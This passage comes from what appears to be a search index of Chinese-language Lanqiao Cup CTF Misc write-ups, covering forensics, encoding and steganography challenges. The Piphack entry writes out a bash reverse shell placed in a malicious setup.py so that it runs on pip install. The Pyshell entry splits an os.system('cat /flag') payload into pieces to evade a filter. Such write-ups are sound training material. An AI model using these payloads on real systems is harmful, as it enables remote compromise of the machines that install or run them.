查看搜索的flag信息，找到flag{Good_b0y_W3ll_Done} 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Misc/find_the_flag.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Misc/find_the_flag.html","title":"Find The Flag","keywords":"","body":"题目描述 find the flag 解题 下载附件，wireshark打开发现包损坏，用010Editor打开搜索flag： 010Editor是与winhex相同类型的工具。 在查看中选择编辑为文本，查看搜索到的flag，找到关键信息： 将信息记录下来得到flag{aha!_you_found_it!} 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Misc/flooding.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Misc/flooding.html","title":"Flooding","keywords":"","body":"题目描述 小蓝在应急响应中成功抓取到了一些 ARP 流量，并发现其中暴露了攻击者的关键信息。通过分析攻击者的MAC地址、IP地址、设备标识符或其他可追溯到攻击者身份的数据，小蓝可以获得有关攻击者的更多洞察，并采取适当的措施应对安全威胁。请帮助小蓝分析出攻击者留下来的踪迹。 解题 下载附件，用wireshark打开 全是ARP报文，无其他信息 随意点击每个报文，可以看出每个报文中只有一个字节发生变化，记录下来： ZmxhZ3s1NTdiNjUyYi1kZDRlLQ== GRTGGOBNHBQWCZBNMY2DEZRYG5TGGYLDGJRH2=== 可以看到一个是base64编码，一个是base32编码； 分别进行解码： flag{557b652b-dd4e- 4fc8-8aad-f42f87fcac2b} 拼接得到flag{557b652b-dd4e-4fc8-8aad-f42f87fcac2b} 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Misc/happy2forensics.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Misc/happy2forensics.html","title":"Happy 2 Forensics","keywords":"","body":"题目描述 小楠楠明明看到了flag，怎么打开文件却找不到呢? 解题 分析题目叫开心的取证，猜测与取证相关，下载附件，发现是一个流量包： 打开提取Http对象查看是否有文件： 可以看到里面有一个非常大的数据包(secret.rar)，猜测是一个压缩包，点击保存为rar包，解压发现是一个磁盘镜像，但是有BitLocker加密； 猜测密码也在流量包中， 检索http流量包，没有发现； 继续检索tcp的80端口，可以看到有很多其他的随机端口，没有规律，但是仔细查看发现有一个20端口的流量，于是进一步检索tcp的20端口和80端口： 可以看到有很多20到80端口的数据交互，因为80到20端口的数据包为ack报文，所以直接检索tcp.srcport==20 && tcp.dstport==80 可以看到有很多几乎相同的数据包，仔细查看每个数据包，发现在每个数据包的一个位置发现BitLocker关键字，将每个数据包的该位置记录下来，得到了BitLocker的密钥： b i t l 注意规律都是6位一组：bitlocker:120483-350966-299189-055297-225478-133463-431684-359403 双击镜像装载，然后再资源管理器双击后，点击输入恢复密钥： 解锁后发现镜像中有很多相同的图片和一个Tips:压缩包真的有密码，无需尝试伪加密、弱口令等。； 仔细查看图片发现有一个图片大小明显不对，并且也打不开。。。 但我们先不管其他，因为已知这道题与取证有关， 所以直接把解锁的驱动器整个作为证据放入AXIOM Process进行取证： Magnet AXIOM取证神器的安装使用方法及详细教程-CSDN博客 点击证据来源，选择windows里的驱动器，选择题目解锁的驱动器： 可以一直点击下一步直到开始分析证据，会打开AXIOM Examine： 点击案件仪表盘中的使用痕迹可以看到取得的信息： 上图中左边一栏的痕迹分类，中间一栏是使用的痕迹文件等信息，右边一栏可以看到文件的预览信息和痕迹来源。 通过查看证据可以知道，有两张图片的来源都是图210-1.png： 可以看到出现了flag1:f97d5b05-d312-46ac 还有一个flag.zip文件来源于磁盘的$RECYCLE.BIN文件夹下E:\\$RECYCLE.BIN\\S-1-5-21-593056737-2904054994-1051541182-1001\\$I6BSXIA.zip 这个文件夹是每个磁盘都有的，是属于磁盘的回收站，也就是说出题者将flag.zip删除了放入了回收站，但是我们通过取证得知该文件还在驱动器的回收站中，可以使用数据恢复软件恢复， DiskGenius – 正式版下载|免费下载 根据之前的驱动器文件的查看可以知道flag.zip这一文件应该就是那个拥有密码的文件了，但是还不知道密码 继续分析，通过之前的取证分析，图片210-1.png下有两个图片，但是光这两个图片显然没有50M内存猜测还有其他文件， 尝试直接将图片210-1.png修改后缀，发现rar后缀下可以进行解压：（一共685张图片） 对于拼接图片可以使用apt install imagemagick在kali中安装imagemagick工具： 使用方法是 convert +append [图片1] [图片2] [...] [最后拼接的图片] 但是我们有很多图片，所以通过批处理合并，以下是一个批处理shell脚本； #!/bin/bash # 循环遍历0-14267的文件名，并逐个合并到book.txt中 #str = \"\" for i in {0..685}; do file=\"${i}.png\" str=\"${str}${file} \" done echo $str convert +append $str passwd.png 最后拼接的图片： 可以看到password：856a-a56b6a705653 同时我们也可以看一下其他图片拼接出来是什么： #!/bin/bash # 循环遍历0-14267的文件名，并逐个合并到book.txt中 str = \"\" for i in {0..267}; do file=\"${i}.png\" str=\"${str}${file} \" done echo $str convert -append $str tupian.png 拼接出来后： 拥有压缩包密码后，就开始提取flag.zip文件，我使用DiskGenius数据恢复软件进行提取： 打开软件，选取路径E:\\$RECYCLE.BIN\\S-1-5-21-593056737-2904054994-1051541182-1001\\： 提取出后得到flag.txt看到flag2:-919c-a140d7054ac5 拼接得到flag：f97d5b05-d312-46ac-919c-a140d7054ac5 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Misc/Matrix.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Misc/Matrix.html","title":"Matrix","keywords":"","body":"题目描述 I like to approach problems with a fresh perspective and try to visualize the problem at hand. 翻译： 我喜欢用全新的视角来解决问题，并尝试将手头的问题图像化。 解题 下载文本得到33行： 0x00000000 0xff71fefe 0x83480082 0xbb4140ba 0xbb6848ba 0xbb4a80ba 0x83213082 0xff5556fe 0xff5556fe`重复 0x00582e00 0x576fb9be 0x707ef09e 0xe74b41d6 0xa82c0f16 0x27a15690 0x8c643628 0xbfcbf976 0x4cd959aa 0x2f43d73a 0x5462300a 0x57290106 0xb02ace5a 0xef53f7fc 0xef53f7fc`重复 0x00402e36 0xff01b6a8 0x83657e3a 0xbb3b27fa 0xbb5eaeac 0xbb1017a0 0x8362672c 0xff02a650 0x00000000 根据题目描述是猜测让我们将这些数据转化成图片， 想到二维码，编写代码获取二维码： from PIL import Image MAX = 31 pic = Image.new(\"RGB\", (MAX, MAX)) hexdata = [] with open(\"D:/ctfbase/LanQiao/Misc/Matrix/matrix.txt\", \"r\") as f: for i in range(33): hexdata.append(f.readline().strip('\\n')) # 移除7行和22行的重复值 hexdata.pop(22) hexdata.pop(7) print(hexdata) with open(\"D:/ctfbase/LanQiao/Misc/Matrix/bindata.txt\", \"w\") as f: binint = bin(int(hexdata[0], 16)) f.write(str(binint[2:].zfill(33))) for i in range(1, 31): binint = bin(int(hexdata[i], 16)) f.write('\\n' + str(binint[2:].zfill(33))) # 限定写入行数为31 bindata = '' with open(\"D:/ctfbase/LanQiao/Misc/Matrix/bindata.txt\", \"r\") as f: for i in range(31): data = f.readline().strip('\\n') print(data) for j in range(32, -1, -1): # 同样删除第7列和第22列，使矩阵行列相同 if j == 22: continue if j == 7: continue bindata += data[j] print(bindata) # 二维码打印代码，需要记住 i = 0 for y in range(0, MAX): for x in range(0, MAX): if bindata[i] == '1': pic.putpixel([x, y], (0, 0, 0)) else: pic.putpixel([x, y], (255, 255, 255)) i += 1 pic.show() pic.save(\"D:/ctfbase/LanQiao/Misc/Matrix/flag.png\") 得到二维码： 扫描得到flag：IceCTF{1F_y0U_l0oK_c1Os3lY_EV3rY7h1N9_i5_1s_4nD_0s} 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Misc/piphack.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Misc/piphack.html","title":"Piphack","keywords":"","body":"题目描述 可以安装任意包的接口，你会怎么利用呢? 解题 根据搜索该题为RCE漏洞的利用，本题的主要原理就是pip在下载包以后，会自动进行解压然后执行setup.py文件，那么可以人为构造一个带有恶意代码的setup.py文件，然后把该文件压缩，和png图片合在一起上传至公网服务器上，当题目执行pip安装包时，会触发我们自己构建的setup.py文件中的代码。 解题需求：要求一台具有稳定ipv4地址并开启web服务的服务器； 一、构建恶意图片 1、随便找一张图片； 2、构建反弹shell，使出题服务器使用pip安装时自动与我们的服务器建立tcp连接 __import__('os').system(\"bash -c 'bash -i >& /dev/tcp/自己服务器IP地址/端口号 0>&1'\") 解释： bash -c \"cmd string\" 接的是shell命令字符串，用引号括起来，运行后面的命令； bash -i 创建一个交互式bash进程 >& 将标准输入和标准错误输出重定向到文件/dev/tcp/自己服务器IP地址/端口号; /dev/tcp/自己服务器IP地址/端口号 一个特殊的设备，打开了这个文件相当于发出了一个socket调用，建立一个socket连接; 0>&1 将标准输入重定向到标准输出,使我们既能进行输入，又能看到输出 注意服务器的端口一定要是开放的 将上面的代码放入setup.py中，然后创建一个文件夹（名字英文任取），将setup.py放入文件夹，然后压缩文件夹，得到文件夹.zip 3、在windows电脑的cmd窗口上用命令 copy /b tupian.png + 文件夹.zip tupian.png 二、上传图片至服务器网站目录 需注意上传的图片一定要能正常访问，可以在浏览器上测试。 三、开始解题 1、先在服务器上使用nc命令监听端口 sudo nc -lvn 端口 2、然后用nc连接题目给出的地址 这里发现题目过滤了http，尝试使用Http绕过，等待一会儿发现在我们的服务器上已经连接上，说明成功，接下来就是一系列测试命令最终发现flag{a262d436-704d-402b-881d-c487d7cf945f} 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Misc/puzzle.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Misc/puzzle.html","title":"Puzzle","keywords":"","body":"题目描述 你会拼图么 点击跳转结语 前置知识 BMP（全称Bitmap）是Windows操作系统中的标准图像文件格式，可以分成两类：设备相关位图（DDB）和设备无关位图（DIB），使用非常广。它采用位映射存储格式，除了图像深度可选以外，不采用其他任何压缩，因此，BMP文件所占用的空间很大。BMP文件的图像深度可选lbit、4bit、8bit及24bit。BMP文件存储数据时，图像的扫描方式是按从左到右、从下到上的顺序。由于BMP文件格式是Windows环境中交换与图有关的数据的一种标准，因此在Windows环境中运行的图形图像软件都支持BMP图像格式。 bmp文件格式 BMP格式的文件从头到尾依次是如下信息： bmp文件头（bmp file header）：共14字节； 位图信息头（bitmap information）：共40字节； 调色板（color palette）：可选； 位图数据； 如: 其中绿色的是bmp文件头，粉色为位图信息； bmp文件头 a. 0-1：bfType，表示文件类型，BMP格式的文件这两个字节是0x4D42，字符显示就是‘BM’； b. 2-5：bfSize，表示文件的大小； c. 6-7：bfReserved1，保留位，必须设置为0； d. 8-9：bfReserved2，保留位，必须设置为0； e. a-d：bfOffBits，4字节的偏移，表示从文件头到位图数据的偏移。 位图信息头 位图信息头一共40字节，包含如下内容： 变量名 大小 作用 biSize 4字节 信息头的大小，即40； biWidth 4字节 以像素为单位说明图像的宽度； biHeight 4字节 以像素为单位说明图像的高度，同时如果为正，说明位图倒立（即数据表示从图像的左下角到右上角），如果为负说明正向； ... ... ... 解题思路 下载附件，发现是很多bmp图片，根据对bmp文件的分析，我们知道想要拼接bmp图片，需要知道它的x，y，width，height信息，而这些信息都在图片中 CTF中，tmp类型的拼图，因为tmp文件特性，在文件头的位置会有其在原图片上的位置坐标。 因为文件头中其他字段都有用，所以x，y坐标一般在文件头中的两个保留字段中 所以这些信息位置是： x= file[6:8] y= file[8:10] width = file[0x12:0x16] width = file[0x16:0x1A] 编写代码，首先计算原图片大小，然后根据坐标对小图片进行拼接 代码如下： from PIL import Image, ImageOps import os # 计算原图片大小 files = os.listdir('D:/ctfbase/LanQiao/Misc/puzzle/tmp4/') # 列出指定目录下的文件和子目录赋给files,返回的是列表 size = [] # 用来存储每个图大小 for i in files: with open('D:/ctfbase/LanQiao/Misc/puzzle/tmp4/' + i, 'rb') as f: data = f.read() # 得到的data值类型是bytes，需要将其转换成int型 x = int.from_bytes(data[6:8], 'little') # 用litte是因为数据存储时前面的数据储存在高位 y = int.from_bytes(data[8:10], 'little') width = int.from_bytes(data[0x12:0x16], 'little') # height = int.from_bytes(data[0x16:0x1A], 'little') height = 100 size.append([(y, x), (height, width)]) sorted_size = sorted(size, key=lambda x: x[0]) # 按照第一位进行排序,即（y,x）排序 print(sorted_size) imgwidth = sorted_size[-1][0][1] + sorted_size[-1][1][1] imgheigth = sorted_size[-1][0][0] + sorted_size[-1][1][0] print(imgwidth, imgheigth) # 拼接图片 img_mod = Image.open('D:/ctfbase/LanQiao/Misc/puzzle/tmp4/16993501.bmp') image = Image.new(img_mod.mode, (imgwidth, imgheigth)) for i in files: with open('D:/ctfbase/LanQiao/Misc/puzzle/tmp4/' + i, 'rb') as f: data = f.read() x = int.from_bytes(data[6:8], 'little') y = int.from_bytes(data[8:10], 'little') img = Image.open('D:/ctfbase/LanQiao/Misc/puzzle/tmp4/' + i) image.paste(img, (x, y)) image.save('D:/ctfbase/LanQiao/Misc/puzzle/flag.bmp') print('已保存图片，路径为：D:/ctfbase/LanQiao/Misc/puzzle/flag.bmp') 得到图片1： 发现有一部分小图片是反的，我们通过判断height的正负来翻转反的图片 height = int.from_bytes(data[0x16:0x1A], 'little', signed=True) # signed=True代表该值带正负 更改代码得到完整的图片： ... # 拼接图片 img_mod = Image.open('D:/ctfbase/LanQiao/Misc/puzzle/tmp4/16993501.bmp') image = Image.new(img_mod.mode, (imgwidth, imgheigth)) for i in files: with open('D:/ctfbase/LanQiao/Misc/puzzle/tmp4/' + i, 'rb') as f: data = f.read() x = int.from_bytes(data[6:8], 'little') y = int.from_bytes(data[8:10], 'little') height = int.from_bytes(data[0x16:0x1A], 'little', signed=True) # 判断该图片是否被翻转，signed=True代表该值带正负 img = Image.open('D:/ctfbase/LanQiao/Misc/puzzle/tmp4/' + i) if height 使用图片隐写神器stegsolve查看，并对其进行数据提取： 选择RGB的最低位通道，作用是在于把最低位的二进制全部提取出来： 可以看到有flag，但是只有一部分，flag{f1R5T_part_1s_LSB_sTeG0_，还有一部分，好像思路又断了，但是在之前拼接图片时，有部分图片是反的猜测这些数据是不是就是flag的另一部分，更改代码，将图片通过二进制表示出来，翻转的图片为0，未翻转的为1： ...... # 拼接图片 img_mod = Image.open('D:/ctfbase/LanQiao/Misc/puzzle/tmp4/16993501.bmp') image = Image.new(img_mod.mode, (imgwidth, imgheigth)) bindata = [] for i in files: with open('D:/ctfbase/LanQiao/Misc/puzzle/tmp4/' + i, 'rb') as f: data = f.read() x = int.from_bytes(data[6:8], 'little') y = int.from_bytes(data[8:10], 'little') height = int.from_bytes(data[0x16:0x1A], 'little', signed=True) # 判断该图片是否被翻转，signed=True代表该值带正负 img = Image.open('D:/ctfbase/LanQiao/Misc/puzzle/tmp4/' + i) if height 得到flag的di二部分：2nd_paRT_15_reVeRSe_bMp_ 并且在flag2后面还有一段摩斯密码.--. .- -..，猜测是对第三部分flag的提示 解码得到PAD，想到python的pad函数，也就是填充函数， 考虑到bmp文件特性，bmp是按⾏绘制的，每⾏数据都需要为4的倍数，当像素数据不满⾜这个条件时，会⾃动填充相应字节的0。而在这道题中出题人很明显修改了这个填充的值，我们需要把这个值按照拼图的排列方式提取出来。 所以我们需要再次对小图片进行操作，将文件后面多出来的填充字段进行提取； 代码如下： ...... # 第三部分flag代码 files = os.listdir('D:/ctfbase/LanQiao/Misc/puzzle/tmp4/') sorted_data = [] for i in files: with open('D:/ctfbase/LanQiao/Misc/puzzle/tmp4/' + i, 'rb') as f: data = f.read() x = int.from_bytes(data[6:8], 'little') y = int.from_bytes(data[8:10], 'little') width = int.from_bytes(data[0x12:0x16], 'little', signed=True) if 4 - 3 * width % 4 == 4: padding_size = 0 else: padding_size = 4 - 3 * width % 4 img_data_size = 3 * width length = len(data[54:]) img_data = data[54:] padding_data = b'' for j in range(img_data_size, length, img_data_size + padding_size): padding_data += img_data[j:j + padding_size] sorted_data.append([(y, x), padding_data]) sorted_data = sorted(sorted_data, key=lambda x: x[0]) padding_wenjian = b'' for i in sorted_data: padding_wenjian += i[1] print(padding_wenjian[:1000]) with open('D:/ctfbase/LanQiao/Misc/puzzle/3_flag', 'wb') as f: f.write(padding_wenjian) ...... 通过winhex查看数据发现该文件的文件头与jpg一样，直接改成jpg格式：得到图片，看到图片中是第三部分flag： 3rd_ parT_ 1s_ paddINGINGING} 拼接flag得到完整flag： 点击跳转 下面是完整代码： from PIL import Image, ImageOps import os from Crypto.Util.number import long_to_bytes # 计算原图片大小 files = os.listdir('D:/ctfbase/LanQiao/Misc/puzzle/tmp4/') # 列出指定目录下的文件和子目录赋给files,返回的是列表 size = [] # 用来存储每个图大小 for i in files: with open('D:/ctfbase/LanQiao/Misc/puzzle/tmp4/' + i, 'rb') as f: data = f.read() # 得到的data值类型是bytes，需要将其转换成int型 x = int.from_bytes(data[6:8], 'little') # 用litte是因为数据存储时前面的数据储存在高位 y = int.from_bytes(data[8:10], 'little') width = int.from_bytes(data[0x12:0x16], 'little') # height = int.from_bytes(data[0x16:0x1A], 'little') height = 100 size.append([(y, x), (height, width)]) sorted_size = sorted(size, key=lambda x: x[0]) # 按照第一位进行排序,即（y,x）排序 imgwidth = sorted_size[-1][0][1] + sorted_size[-1][1][1] imgheigth = sorted_size[-1][0][0] + sorted_size[-1][1][0] # 拼接图片 img_mod = Image.open('D:/ctfbase/LanQiao/Misc/puzzle/tmp4/16993501.bmp') image = Image.new(img_mod.mode, (imgwidth, imgheigth)) bindata = [] for i in files: with open('D:/ctfbase/LanQiao/Misc/puzzle/tmp4/' + i, 'rb') as f: data = f.read() x = int.from_bytes(data[6:8], 'little') y = int.from_bytes(data[8:10], 'little') height = int.from_bytes(data[0x16:0x1A], 'little', signed=True) # 判断该图片是否被翻转，signed=True代表该值带正负 img = Image.open('D:/ctfbase/LanQiao/Misc/puzzle/tmp4/' + i) if height 结语 79位的flag。。。人麻了，纯纯有病！！！ 第一个flag需要知道bmp的文件头信息，根据这些信息得到原图大小，在将每个小图片在新建大小画布上进行拼接得到原图，再将原图通过图片隐写神器提取数据得到flag1； 第二个flag需要注意在拼接第一个flag是会出现的图片翻转的问题，根据此猜测，由于图片翻转只有两种情况（正反），想到二进制0 1，在将flag1得到的图片通过0 1输出，再将二进制数据转换成字节类型得到flag2和一个flag3的提示； 第三个flag需要根据flag2后出现的摩斯密码PAD，搜索python PAD得知PAD是python中的填充函数，猜测flag3与填充有关，在根据bmp打印时是按行打印，并且打印数据必须是4的倍数，少的填充0，二在本题中作者更改了填充的0为其他数据，需要我们将这些填充的数据提取出来，提取出后，查看提取数据的特征，发现首部与jpg文件头相同，猜测该数据是一段jpg图片，将其输出为jpg图片，得到flag3 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Misc/PyHaHa.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Misc/PyHaHa.html","title":"Py Ha Ha","keywords":"","body":"题目描述 解题 下载附件，一个pyc文件，放入010editor中查看： 可以看到几个关键信息flag1和flag2、和一个MP3文件， 正常的pyc文件一般不会有这么大，猜测里面还有其他文件比如那个MP3文件 但是观察010editor数据，可以看到文件中的数据好像是反过来的；编写一个python小脚本反过来 with open(\"D:/ctfbase/LanQiao/Misc/pyHAHA/PyHaHa_reverse.pyc\", \"wb\") as file: with open(\"D:/ctfbase/LanQiao/Misc/pyHAHA/PyHaHa.pyc\", \"rb\") as f: file.write(f.read()[::-1]) 得到正常的数据文件： 可以看到缺少了pyc文件头，但是并不知道python版本不知道他的文件头 根据CTF题目经验，猜测可能是2.7、3.7、3.8这几个版本中的一个 其中 2.7版本文件头：03F3 0D0A 3.8版本文件头：550D 0D0A 添加文件头用python相应版本的uncompyle6反编译，或者使用pyc在线反编译网站： python反编译 - 在线工具 (tool.lu) pyc反编译 - 工具匠 (toolkk.com) 得到源文件： 根据源代码输出可知flag1和flag2的结果即为文件末尾的数据： flag1=ec8d57d820ad8c586e4be0122b442c871a3d71cd8036c45083d860caf1793ddc flag2=c40a0be335babcfbd8c47aa771f6a2ceca2c8638caa5924da58286d2a942697e 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Misc/pyshell.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Misc/pyshell.html","title":"Pyshell","keywords":"","body":"题目描述 flag在/flag，每个容器只支持同时连接一个客户端。部分指令可能导致容器无响应，如果出现这样的情况请重启题目环境 解题思路 下发题目，得到一个nc连接的地址，用nc命令连接 可以看到是一个类似的shell窗口，查询得知这是CTF中的伪python shell题目； 伪Python shell是指一种CTF（Capture The Flag）中的题目类型，它要求我们在一个受限制的Python环境中执行代码，从而获取flag。伪Python shell的特点和作用是考察我们对Python语言的熟悉程度和逆向能力，以及如何利用Python的一些特性来绕过沙箱限制。解决这样的CTF题目的方法有很多，具体取决于题目的限制条件和漏洞点，一般需要利用字符串拼接、类静态方法、反序列化、系统命令等技巧来构造有效的payload。 输入一些命令发现全是输出nop，根据题目描述，flag在' /flag '中，所以我们的思路是思路是通过输入python代码执行shell命令但是题目过滤了这些命令（如import print等）。并且一次发现只能输入7个字符（包括''） 所以我们换一个查询思路：__import__('os').system('cat /flag') 并且因为题目限制了每次输入的字符数，所以我们需要通过_+来连接每次输入的代码： '__imp' _+'ort' _+'__(' _+\"'os\" _+\"').\" _+\"sys\" _+\"tem\" _+\"('c\" _+\"at \" _+\"/fl\" _+\"ag'\" _+\")\" eval(_) ''+ 表示在下一个字符串拼接操作之前对字符串进行了临时的拼接操作。例如，代码中的 `+'ort'实际上是 + 'ort'，表示将上一个字符串与'ort'` 进行拼接。这种形式的字符串拼接操作用于在代码中以一种连贯的方式构建出整个字符串。 得到flag{80f772f1-6740-4571-87ba-cf6b3db34581} 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Misc/Random.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Misc/Random.html","title":"Random","keywords":"","body":"题目描述 答案加flag{} 解题 下载附件，题目给了一个pyo文件和一个二进制文件flag.enc 对pyo文件进行反编译： 在线pyc,pyo,python,py文件反编译 得到源代码： from random import randint from math import floor, sqrt _ = '' __ = '_' ____ = [ ord(___) for ___ in __ ] _____ = randint(65, max(____)) * 255 for ___ in range(len(__)): _ += str(int(floor(float(_____ + ____[___]) / 2 + sqrt(_____ * ____[___])) % 255)) + ' ' print _ 可以看出附件的flag.enc就是代码的输出结果， 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Misc/ReCreators.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Misc/ReCreators.html","title":"Re Creators","keywords":"","body":"题目描述 ReCreators 解题 下载附件，文件没有后缀，用winhex打开查看发现是KDMV格式， 之前没遇到过，先用binwalk分析一下，发现有很多文件，提取出来： 得到一系列文件： 看到这个文件，发现根word文档的格式一模一样， 于是先将文件改为docx后缀，打开： 得到一段数字： 3441344134383435353535323533344534423541344135353334353333323446344134453433353533323536343335343441354134343535353535343433343634423335344334363437353634333443344235413434343534443536344235343439344534433535353535363533344234393541343435363435353533323531343933353443343534443536344234453442353634363436344235333442344634413445343335363446353533323534344233353436353634353532353335373439353634413534343535363332344234413541343634353442353234423533344134413442353535393532353334383439353535413436343735333332353734413532343434353539353234423534344135353541343534393533354135363439353634433436344235353532353334423335343634353334353334333536344233353441343634373534343334443441344134343436344235343442353334413445344235353446353335333444344235363441353634463535333234443441353234323435353335363533344534423444354134363531353335333446343935413433353634423535353235333441353234343535353535343533343734413536344135353537353633323442344234413433343534423535333235363441344534423435353735343533343734423541344235363435353133323438344134453443343535333536343334363442354134363535333635333332344234393541343335353332353634333443344235363436343533343532343334363441333534433436343735373533344334433441343434363444353434423532343734413435343535353533344135333442353634443536343535333332344434393335343535363535353635333534344234443541343634373533353335373439353634333535343735363533344234423445343635353535353334333436343734413437353634373536353334423442354134373435343935323442353834413445343934353533353335333436343935413437353634393533333235343441344534383435344435363442353434423541344135353539353334413536344135363443343535373536344135333443343234363435353535343433343634393335344334353437353634333443344334413434343634443534333235353439344534323535353935323533343434423532343735363444353533323535344134363445343534393536344234363441353535413436344635333533343734393335344235353446353634413533344135323436343635353532353334363441344534413534343535343332344234413541343334363442353633323534344234453437343535333536353334383442354134353535333234443533343834413441344534353535353234423538344233353432353634393533333233323439344534333536353335353541353334413445343634363435353133323535343935363442353634373536343334423441354134343436344435343442353534393445343435353537353234413533343935363434353634423531333234443441353234363435343535363533353034423541344534363444353233323442344135323433353434393536344235343441344534353536353535333433353734413445344234353437353434423441343735363437343534423533344235333442344534363435353735373533343334423536343435363437353535333537344134453438343535393536353335343442353634413536343735333541353634393541344334353442353635323533343933353435353634443534343334373439333534423436343735343433344334423541343735363444353534423532343734413443353535373534353334453442353533323436344235353332344134413445344534353437353635333445344234453441353634353533353235353437344134423536344635353533343434393532343635363444353335333536343735413442343535373536333234423441354134363535344235363332353734423445343734353539353135333437344235413433353634333535333234383441343533323535333235363442354134423532343235353531353334423536344334413442353533323535333234423442344534343535353535343433353634423445344335363437353334333443344334413434343634423445343335353439344534413535353535343533344434393541343735363444353335333536344134453439353635353532353335303442344435413436344635333533344634413536343434353437353635333534343935323437343534443533343335363439353634423435343735323533343834413441343734353442353634423537344234453436343535393533353334373442354134373536343735333332353434413445343834353535353634423538344233353441353534393533333235333439344134423534343935363441353334423541343634363535353335333436344334363441343535373534353334433442344134343436344235343332353434413444354134353539353235333444343935353541343634443535333234353441344134383435344435323433344334423445344135353446353335333445344334413433343534463536333234343441353234363535353535343433353634413536344134353537353635333443344135413435343534423536333235373441344534453435353735353533343834423541343735363433344435333537344134413434343534443532344235323442343935413435353935323332344634393441344334353332353535323533343934453436343533343532343335373441333534433435353735363442344334413541343434353444353434423534343734413442353535333534344135333439353634433536344435353332344534413436343634353537353634423443344135413441353634463533333234463439353234423536343735363533353334423536343535363535353234423537344133353441343534373535353334423441343535413436344235363442353334423445343734353535353635333434343935413439353634373444353335383441344134433435344235323442343434423541343634363437353333323442343935413443343534373536333234433439353634363535333234453533353534373441343934353533353034393344 在CyberChef中尝试解密： 直接粘贴进去，发现可以使用魔法棒： 使用后得到： 不难猜测是base家族编码， 尝试后发现是base32，因为在使用base32后又可以使用魔法棒： 之后一直点击魔法棒得到flag{wh4t_a_w0nderfu1_d4y} 最终知道该数据的编码过程： 两次Hex编码-->三次base32解码-->两次bsae64解码-->一次Hex编码-->一次base32解码-->两次base64解码 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Misc/SCAN.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Misc/SCAN.html","title":"SCAN","keywords":"","body":"题目描述 有人在内网发起了大量扫描，而且扫描次数不止一次，请你从 capture日志分析一下对方第4次发起扫描是什么时候开始的， 请提交你发现包编号的sha256值(小写)。 解题 下载附件， 题目给的是一个日志文件，但根据题目分析猜测是流量包，改后缀为pcapng，打开： 观察流量包，可以看到有四个IP（192.168.0.9、192.168.0.1、192.168.0.254、192.168.0.199）分别对192.168.0.99进行了SYN扫描，并且大部分是192.168.0.9在扫描。 分析题目，是： 第一个ip对目标发起的第四次扫描 还是第四个ip对目标发起的第一次扫描 分别对四个IP进行筛选： 192.168.0.9 192.168.0.1 192.168.0.254 192.168.0.199 可以看到只有192.168.0.9对目标发起了四次以上的扫描， 并且每个ip扫描前都对目标进行了ping操作 将第四次扫描的包编号11进行尝试发现不对 所以改变思路将每个ip进行的第一次进行扫描的包编号进行尝试： 最终在192.168.0.199的第一次扫描编号155989尝试成功。 得到flag：PCTF{0be2407512cc2a40bfb570464757fd56cd0a1d33f0bf3824dfed4f0119133c12} 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Misc/shellcode.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Misc/shellcode.html","title":"Shellcode","keywords":"","body":"题目描述 作为一个黑客，怎么能不会使用shellcode? 这里给你一段shellcode，你能正确使用并最后得到flag吗？ 文件：shellcode flag格式：PCTF{flag} 解题 下载打开，是一段shellcode代码，搜索得知有一个shellcode代码运行器 GitHub - bdamele/shellcodeexec: Script to execute in memory a sequence of opcodes 下载好后再cmd中运行代码： 弹窗得到flag：PCTF{Begin_4_good_pwnn3r} 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/CTF竞赛/蓝桥杯/Misc/Warning.html":{"url":"3.网络安全/CTF竞赛/蓝桥杯/Misc/Warning.html","title":"Warning","keywords":"","body":"题目描述 在小蓝进行应急响应期间，他发现了一些可疑的 DNS 